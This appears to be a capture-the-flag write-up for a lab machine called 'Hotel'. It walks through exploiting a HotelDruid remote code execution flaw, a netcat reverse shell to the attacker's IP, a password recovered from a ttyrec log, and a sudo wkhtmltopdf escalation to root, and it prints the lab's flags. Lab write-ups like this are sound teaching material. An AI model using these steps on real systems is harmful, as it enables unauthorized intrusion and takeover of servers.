# Hotel (Easy)

>MrMidnight | 12.August.2022

------------

### Target IP: 192.168.1.103

## 1. Enumeration

Another box another hour of fun. As usual start a nmap scan:

```bash
nmap -sC -sV -oA scans/Nmap/target 192.168.1.103
```

And yes a website is running on the default port. The site seems to be like an hotel booking website. The technology for the hotel booking is called "HotelDruid", as its shown at the end of the page. With a simple google search, I found a [remote-code-execution exploit])([Hotel Druid 3.0.3 - Remote Code Execution (RCE) - PHP webapps Exploit (exploit-db.com)](https://www.exploit-db.com/exploits/50754)) on exploit-db.


## 2. Exploiting

All we have to do is downloading the script and running the exploit:

```bash
wget https://www.exploit-db.com/download/50754
python3 50754.py 
python3 50754.py -t http://hotel.hmv --noauth
```

`ps: dont forget to add the ip to "/etc/hosts" to make eveything easier : )`

If everything worked properly, the tool should provide a link: "http://192.168.186.22/dati/selectappartamenti.php?cmd=whoami" that we can visit to get an shell.

First confirm if its working tho:
```bash
curl http://hotel.hmv/dati/selectappartamenti.php?cmd=whoami

```

```
www-data
www-data

<option value=""></option>
<option value="1">1</option>
<option value="2a">2a</option>
```

Working confirmed! Now for the aual rev shell:

```bash
curl http://hotel.hmv/dati/selectappartamenti.php?cmd=nc%20-e%20/bin/bash%20192.168.1.100%204200
```

The revshell has to be url encoded tho. Also dont forget to setup a listenet:

```bash
nc -lnvp 4200
```

## 3. Enum for user:person

We are in the target! Ill upgrade to an better shell first:

```bash
python3 -c 'import pty;pty.spawn ("/bin/bash")'
export TERM=xterm
Ctrl Z
ssty raw -echo; fg
```

In the www-data's "html" directory, I found a interesting file called: "ttylog". Ill copy that to my attacker machine and analyze it:

```bash
python3 -m http.server 9090
wget http://hotel.hmv:9090/ttylog
strings ./ttylog
```

```
[?2004h
]0;person@hotel: ~
person@hotel:~$ 
[?2004l
[?2004h
]0;person@hotel: ~
person@hotel:~$ 
[?2004l
exit
```

## 4. Hack person
So this has something to do the the "person" user. After a bit of googling, this file is generated by a program called "[ttyrec](https://en.wikipedia.org/wiki/Ttyrec)" Using the tool "ttyplay" (which was already installed on the target), to play back the file that was generated:

```bash
ttyplay /var/www/html/ttylog
```

And just like someone else is typing, it reveals the password for the user person:

>Endur4nc3.

Now we can login with this information:
(you can also ssh into the user person. Its a more stable shell! i recommend always getting a ssh shell)

```bash
su person
```

## USER-FLAG
>RUvSNcQ3m2OyHzxHMV


## 5. Priv esc to root

Using "sudo -l", we can see that the command “wkhtmltopdf” can be run with root permissions. This program can translate text to pdf files. Due to the sudo permissions, it can also be used to get certain files. (Like the flag). Lets do exactly that:

```bash
sudo wkhtmltopdf /root/root.txt /tmp/root.pdf
```

Now just use download the file to your machine using wget + python server, and open the pdf with a imge viewer to view the flag.

## ROOT-FLAG

>7MUnADgp3g4STEPHMV